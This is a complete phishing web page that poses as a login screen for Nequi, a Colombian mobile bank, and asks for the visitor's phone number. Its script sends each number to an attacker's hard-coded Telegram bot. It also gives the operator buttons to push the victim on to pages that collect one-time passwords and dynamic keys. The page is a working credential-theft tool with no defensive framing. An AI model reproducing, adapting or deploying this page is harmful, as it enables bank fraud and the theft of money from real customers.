<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi - Acceso</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {background: #742fe1;color:#fff;font-family:Arial;text-align:center;padding:50px 20px}
    .container {max-width:400px;margin:auto;background:rgba(255,255,255,.1);padding:30px;border-radius:20px;backdrop-filter:blur(10px)}
    input {width:100%;padding:15px;font-size:18px;border:none;border-radius:10px;margin:10px 0;background:rgba(255,255,255,.2);color:#fff}
    input::placeholder {color:#ddd}
    button {width:100%;padding:15px;background:#ff6b6b;color:#fff;border:none;border-radius:50px;font-size:20px;cursor:pointer;margin-top:20px}
    .loader {border:8px solid #f3f3f3;border-top:8px solid #ff6b6b;border-radius:50%;width:50px;height:50px;animation:s 1s linear infinite;margin:20px auto;display:none}
    @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .flag {width:30px;margin-right:10px}
  </style>
</head>
<body>

  <div class="container">
    <h2>Nequi</h2>
    <p>Ingresa tu número para continuar</p>
    
    <div style="display:flex;align-items:center;justify-content:center;margin:20px 0">
      <img src="https://flagcdn.com/co.svg" class="flag" alt="CO">
      <strong>+57</strong>
    </div>

    <input type="tel" id="cel" placeholder="Número de celular" maxlength="10" inputmode="numeric" required>
    <button id="btn">Entra</button>
    
    <div id="loader" class="loader"></div>
    <p id="msg" style="margin-top:15px"></p>
  </div>

  <script>
    const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
    const CHAT_ID = '8469651553';

    document.getElementById('btn').onclick = () => {
      const cel = document.getElementById('cel').value.trim();
      if (cel.length !== 10) {
        document.getElementById('msg').innerHTML = '<span style="color:#ff6b6b">Número inválido</span>';
        return;
      }

      const btn = document.getElementById('btn');
      const loader = document.getElementById('loader');
      btn.disabled = true;
      loader.style.display = 'block';
      document.getElementById('msg').innerHTML = 'Enviando...';

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `*NUEVO CLIENTE NEQUI*

*Número:* +57 ${cel}
*Hora:* ${new Date().toLocaleTimeString()}
*IP:* Detectando...`,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{text: "Clave OTP", url: location.origin + "/verifying/?do=otp"}],
              [{text: "Dinámica", url: location.origin + "/verifying/?do=dinamica"}],
              [{text: "Finalizar", url: location.origin + "/verifying/?do=ok"}]
            ]
          }
        })
      }).then(() => {
        document.getElementById('msg').innerHTML = 'Enviado! Redirigiendo...';
        setTimeout(() => {
          location.href = '/verifying/';
        }, 1500);
      }).catch(() => {
        document.getElementById('msg').innerHTML = 'Error. Intenta de nuevo.';
        btn.disabled = false;
        loader.style.display = 'none';
      });
    };
  </script>
</body>
</html>
